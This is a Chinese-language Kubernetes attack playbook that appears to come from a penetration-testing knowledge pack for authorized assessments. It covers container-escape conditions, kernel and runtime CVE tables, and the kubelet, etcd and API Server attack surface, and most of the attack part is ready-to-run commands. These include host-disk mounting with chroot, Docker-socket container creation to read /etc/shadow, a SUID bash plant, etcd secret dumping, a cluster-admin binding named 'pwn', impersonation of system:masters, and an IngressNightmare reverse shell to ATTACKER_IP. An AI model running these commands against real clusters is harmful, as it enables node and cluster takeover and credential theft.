# K8s 攻击面：容器逃逸判定与集群级扩散

> 适用：已取得 Pod 内执行权、或发现 6443/10250/2379 暴露的授权评估，用来判定"容器内 root"能否升级为"节点/集群控制"。

## 认什么

先把位置分清，三条线互不排斥：容器内执行权、可达 Kubelet/API Server、持有 ServiceAccount Token。

### 1. 逃逸条件矩阵（成功率从高到低）

| 条件 | 判据 | 逃逸路径 |
|---|---|---|
| privileged | `grep CapEff /proc/1/status` 为 `0000003fffffffff`（全能力） | 挂载宿主机磁盘 / cgroup `release_agent` / `nsenter` |
| docker.sock 挂载 | `ls -la /var/run/docker.sock` | 用 Docker API 建挂载 `/` 的特权容器 |
| 可写 hostPath | `cat /proc/self/mountinfo`、`mount \| column -t` | SUID 植入、写 cron、读宿主机 `/etc/shadow` |
| hostPID + CAP_SYS_ADMIN/PTRACE | `ls /proc/*/exe` 能看到大量非容器进程 | `nsenter --target 1 --mount --uts --ipc --net --pid` |
| hostNetwork | `ip addr` 出现节点网卡 | 打节点本地服务、kubelet 10250、云元数据 |
| cgroup v1 + CAP_SYS_ADMIN | `ls -x /s*/fs/c*/*/r*` 存在 `release_agent` | 内核在宿主机侧执行 release_agent |
| 内核/运行时版本命中 | `uname -r`、runc/containerd 版本 | 内核或运行时 CVE |

版本对照（严格对号，不靠猜）：

| 漏洞 | 影响版本 | CVE |
|---|---|---|
| Dirty Pipe | 5.8–5.16.11（修复 5.15.25 / 5.10.102 / 5.4.181） | CVE-2022-0847 |
| Dirty Cow | 2.6.22–4.8.3 | CVE-2016-5195 |
| OverlayFS | Ubuntu 14.04–20.10 | CVE-2021-3493 |
| BPF 校验器绕过 | 5.8.0–5.16 | CVE-2022-23222 |
| Netfilter | 2.6.19–5.12 | CVE-2021-22555 |
| runc | < 1.0-rc6 | CVE-2019-5736 |
| containerd-shim | < 1.3.9 | CVE-2020-15257 |
| cgroup 释放 | CAP_SYS_ADMIN + apparmor=unconfined | CVE-2022-0492 |

### 2. 集群面端口与组件

| 端口 | 组件 | 价值 |
|---|---|---|
| 6443 | API Server | 匿名/Token → 建特权 Pod、读 Secret |
| 8080 | API Server 不安全端口（≤1.23 遗留，1.24 起移除） | 无认证即全控制 |
| 10250 | Kubelet | `/run`、`/exec` 直接命令执行 |
| 10255 | Kubelet 只读 | 全 Pod 与 env 泄露 |
| 2379 | etcd | `/registry/secrets` 全量（含所有 Token） |
| 44134 | Helm v2 Tiller | 通常 cluster-admin |
| 8443 | ingress-nginx Admission Webhook | CVE-2025-1974 |

- 落地节点后先看：`/var/lib/kubelet/kubeconfig`、`/etc/kubernetes/admin.conf`、`/etc/kubernetes/pki/`、`/etc/kubernetes/manifests/`（Static Pod 持久化）；`ps -ef | grep kubelet | grep kubeconfig` 找实际使用的 kubeconfig。
- 云托管集群（EKS/GKE/AKS）在 Pod 内打 IMDS 取节点角色凭据；EKS 另有 IRSA：`$AWS_ROLE_ARN` + `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`。
- 集群内分布式系统还会带出第二战场：节点的 docker.sock、`/run/containerd/containerd.sock`、CNI 配置。

## 打哪（命令）

```bash
# 容器判定 + 取 SA Token
cat /proc/1/cgroup | grep -qi 'docker\|kubepods\|containerd' && echo IN_CONTAINER
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token 2>/dev/null); NS=$(cat $SA/namespace); CA=$SA/ca.crt
APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"

# 权限先摸清：can-i --list / SelfSubjectRulesReview / SelfSubjectAccessReview
kubectl auth can-i --list
curl -sS --cacert "$CA" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  --data '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"'"$NS"'"}}'
```

特权 / docker.sock / 可写 hostPath：

```bash
mkdir -p /tmp/hostroot && mount /dev/sda1 /tmp/hostroot && chroot /tmp/hostroot bash
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' \
  http://localhost/containers/create \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/shadow"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
# 可写 hostPath 且宿主机挂载点未加 nosuid：植入 SUID 后由宿主机侧触发
cp /bin/bash /var/www/html/suidbash && chmod 6777 /var/www/html/suidbash
```

Kubelet / etcd：

```bash
curl -sk https://NODE_IP:10250/pods
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER -d 'cmd=id'
curl -s http://NODE_IP:10255/pods
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix --print-value-only | strings | grep eyJ
```

RBAC → 集群控制（命中任一条即可升级）：

```bash
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default
kubectl create token default --duration=999999h
kubectl patch pod POD --type=strategic --subresource=ephemeralcontainers \
  -p '{"spec":{"ephemeralContainers":[{"name":"d","image":"alpine","command":["sh"],"securityContext":{"privileged":true}}]}}'
curl -sk -H "Authorization: Bearer $TOKEN" -H "Impersonate-User: null" \
  -H "Impersonate-Group: system:masters" "$APISERVER/api/v1/namespaces/kube-system/secrets/"
```

IngressNightmare（CVE-2025-1974，无需 K8s 凭据；影响 ingress-nginx < 1.12.1 与 < 1.11.5）：

```bash
# 三步链：大请求把 .so 缓存成 /tmp/client_body_temp/0000000001 → AdmissionReview 注入 ssl_engine → nginx -t 加载
ingressnightmare -m c -c 'id' -i https://INGRESS:8443 -u http://UPLOADER:80
ingressnightmare -m r -r ATTACKER_IP -p 4444 -i https://INGRESS:8443 -u http://UPLOADER:80
```
注入入口三选一：CVE-2025-24514 `auth-url`（`--is-auth-url`）、CVE-2025-1097 `auth-tls-match-cn`（`--is-match-cn`）、CVE-2025-1098 mirror UID（`--is-mirror-uid`）。架构不符报 `Exec format error` 时：`ingressnightmare show-c > exp.c`，交叉编译后 `--so ./danger.so`。

Istio 策略绕过（Envoy 以 UID 1337 运行，iptables 排除该 UID 以免死循环）：

```bash
grep 1337 /etc/passwd                       # istio:x:1337:1337
su -s /bin/sh istio -c 'curl -sv http://target.ns.svc.cluster.local'   # 或 runuser -u istio --
curl -s localhost:15000/config_dump | grep -i secret
curl -s localhost:15014/debug/configz
```

## 什么算成

- 特权/hostPath 线：容器内读到宿主机 `/etc/shadow`、`/root/.ssh/`、`/var/lib/kubelet/kubeconfig` 或 `admin.conf`，贴命令与原样输出，并注明这是"宿主机 root"而非容器 root。
- Kubelet 10250：`/run` 或 `/exec` 返回 `id` 输出；`/pods` 可列且能对目标容器执行。
- etcd 2379：`/registry/secrets` 有明文 Secret，Token 形如 `eyJ` 开头。
- API 线：创建 privileged/hostPath Pod 返回 201 且节点侧证据成立；或 `create clusterrolebindings`、`impersonate system:masters` 后能列 `kube-system` 的 Secret。
- IngressNightmare：admission 侧不返回 401，PoC 有稳定命令输出/回连；落地 Pod 内可读 ingress SA Token（通常 cluster-wide 权限）。
- Istio 1337：**同一 URL、同一方法、同一路径**——普通身份 403 RBAC denied、切到 istio 身份 200，这是唯一干净的对照证据。

## 假点

- `CapEff` 全 1 但 `mount` 报 permission denied：设备未暴露或被 AppArmor/LSM 拦；gVisor/Kata 等内核沙箱下全能力同样到不了宿主机。
- docker.sock 存在但 `permission denied`：容器用户不在 docker 组，或 sock 只读挂载。
- 10250 可达却返回 401：启用了 webhook 认证，需要真实凭据；10255 的信息泄露**不等于**可执行。
- SA Token 能列本 namespace Pod，但 `create pods`/`list secrets` 403：只是自身前缀权限。
- 内核版本对上只是表面：以 `/proc/version` 的发行版补丁号为准；exploit 无输出即换层，不要复述"可能可打"。
- ingress 8443 通但 `nginx -t` 不加载 `ssl_engine`、无回连：版本已修或 webhook 有认证。
- `/etc/passwd` 有 istio 用户，但容器无 `su`/`runuser` 或当前非 root：绕不过；且 UID 1337 只绕 Envoy 层策略，PeerAuthentication STRICT 的 mTLS 仍会拒绝。
- 只读到 Pod 环境变量就宣称"云账号沦陷"：未取到 IMDS 凭据或 STS，就停在信息泄露档。

## 与其他包联动

- 集群内横向（DNS 侦察、sidecar 抓包、NFS/EFS、准入策略引擎）：`./cloud-07-K8s攻击面-组件-网络-存储.md`。
- Docker daemon/API、镜像层与 Registry：`./cloud-08-容器运行时与镜像.md`。
- 节点 IMDS → 云凭据 → 对象存储：`./cloud-09-对象存储与Serverless.md`、`./对象存储与云元数据实战.md`。
- CI Runner 里常躺着 kubeconfig：`./cloud-10-CICD与供应链与IaC.md`。
- Web 侧 SSRF 才是元数据入口时：`../../web-ssrf-render/knowledge/ssrf-internal-network-02-二、云元数据-打内网核心.md`。
- 证据与定级：`../../../../rules/40-evidence-report.md`；改动边界：`../../../../rules/20-min-harm.md`。
